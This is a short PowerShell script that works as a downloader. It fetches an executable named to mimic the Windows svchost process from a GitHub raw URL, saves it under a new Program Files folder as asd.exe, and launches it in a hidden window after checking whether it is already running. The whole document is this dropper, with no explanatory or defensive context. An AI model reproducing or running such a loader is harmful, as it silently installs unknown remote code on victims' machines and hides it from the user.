if(Get-Process -Name "asd" -ErrorAction SilentlyContinue){exit}
$url="https://github.com/requiemmmmmmm/reqq/raw/main/scvhost.exe"
$path="${env:ProgramFiles}\deluga"
if(!(Test-Path $path)){
    New-Item -ItemType Directory -Path $path -Force|Out-Null
}
$file="$path\asd.exe"
(New-Object System.Net.WebClient).DownloadFile($url,$file)
Start-Process -FilePath $file -WindowStyle Hidden